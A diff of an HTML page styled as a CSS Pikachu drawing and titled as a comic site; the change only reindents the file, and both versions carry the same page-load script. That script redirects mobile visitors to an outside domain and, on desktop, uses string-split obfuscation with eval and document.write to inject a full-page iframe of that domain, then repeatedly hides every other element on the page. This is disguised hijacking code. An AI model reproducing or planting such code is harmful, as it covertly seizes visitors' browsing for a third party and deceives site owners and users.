@@ -1,74 +1,73 @@
 <!doctype html>
 <html lang="zh-hans">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport"
-          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>歪歪漫画</title>
-    <link rel="stylesheet" href="https://lxiaox.github.io/pikachu-demo/css/default.css">
-	<style type="text/css" media="screen">
-        iframe{
-            display: none;
-        }
-    </style>
-</head>
-<body onLoad="open_without_referrer()">
-    <div class="container">
-        <div class="pikachuHead">
-            <img class="lighting-left" src="https://lxiaox.github.io/pikachu-demo/img/lighting.gif" alt="闪电">
-            <img class="lighting-right" src="https://lxiaox.github.io/pikachu-demo/img/lighting.gif" alt="闪电">
-            <div class="ear-left"></div>
-            <div class="ear-right"></div>
-            <div class="eye-left"></div>
-            <div class="eye-right"></div>
-            <div class="nose"></div>
-            <div class="mouth"></div>
-            <div class="check-left"></div>
-            <div class="check-right"></div>
-        </div>
-        <div class="pikachuBody">
-            <div class="hand-left"></div>
-            <div class="hand-right"></div>
-            <div class="firstMark"></div>
-            <div class="lastMark"></div>
-        </div>
-        <div class="foot-left"></div>
-        <div class="foot-right"></div>
-        <div class="tail">
-            <div class="part1"></div>
-            <div class="part2"></div>
-            <div class="part3"></div>
-            <div class="part4"></div>
-            <div class="part5"></div>
-        </div>
-    </div>
-	<script>
-function goPAGE() {
-    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-        window.location.href = "https://wap.xiaoaipan.cn/index.html"
-    } else {
-        var ss = '<center id="yangchen"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="83' + '50" src="https://wap.xiaoaipan.cn/index.html"></iframe></center>';
-        eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
-        try {
-            setInterval(function() {
-                try {
-                    document.getElementById("div" + "All").style.display = "no" + "ne"
-                } catch (e) {}
-                for (var i = 0; i < document.body.children.length; i++) {
-                    try {
-                        var tagname = document.body.children[i].tagName;
-                        var myid = document.body.children[i].id;
-                        if (myid != "iconDiv1" && myid != "yangchen") {
-                            document.body.children[i].style.display = "non" + "e"
-                        }
-                    } catch (e) {}
-                }
-            }, 100)
-        } catch (e) {}
-    }
-}
-goPAGE();
-</script>
-</body>
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0,maximum-scale=1.0, minimum-scale=1.0">
+		<meta http-equiv="X-UA-Compatible" content="ie=edge">
+		<title>歪歪漫画</title>
+		<link rel="stylesheet" href="https://lxiaox.github.io/pikachu-demo/css/default.css">
+		<style type="text/css" media="screen">
+			iframe{
+				display: none;
+			}
+		</style>
+	</head>
+	<body onLoad="open_without_referrer()">
+		<div class="container">
+			<div class="pikachuHead">
+				<img class="lighting-left" src="https://lxiaox.github.io/pikachu-demo/img/lighting.gif" alt="闪电">
+				<img class="lighting-right" src="https://lxiaox.github.io/pikachu-demo/img/lighting.gif" alt="闪电">
+				<div class="ear-left"></div>
+				<div class="ear-right"></div>
+				<div class="eye-left"></div>
+				<div class="eye-right"></div>
+				<div class="nose"></div>
+				<div class="mouth"></div>
+				<div class="check-left"></div>
+				<div class="check-right"></div>
+			</div>
+			<div class="pikachuBody">
+				<div class="hand-left"></div>
+				<div class="hand-right"></div>
+				<div class="firstMark"></div>
+				<div class="lastMark"></div>
+			</div>
+			<div class="foot-left"></div>
+			<div class="foot-right"></div>
+			<div class="tail">
+				<div class="part1"></div>
+				<div class="part2"></div>
+				<div class="part3"></div>
+				<div class="part4"></div>
+				<div class="part5"></div>
+			</div>
+		</div>
+		<script>
+			function goPAGE() {
+				if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
+					window.location.href = "https://wap.xiaoaipan.cn/index.html"
+				} else {
+					var ss = '<center id="yangchen"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="83' + '50" src="https://wap.xiaoaipan.cn/index.html"></iframe></center>';
+					eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
+					try {
+						setInterval(function() {
+							try {
+								document.getElementById("div" + "All").style.display = "no" + "ne"
+							} catch (e) {}
+							for (var i = 0; i < document.body.children.length; i++) {
+								try {
+									var tagname = document.body.children[i].tagName;
+									var myid = document.body.children[i].id;
+									if (myid != "iconDiv1" && myid != "yangchen") {
+										document.body.children[i].style.display = "non" + "e"
+									}
+								} catch (e) {}
+							}
+						}, 100)
+					} catch (e) {}
+				}
+			}
+			goPAGE();
+		</script>
+	</body>
 </html>
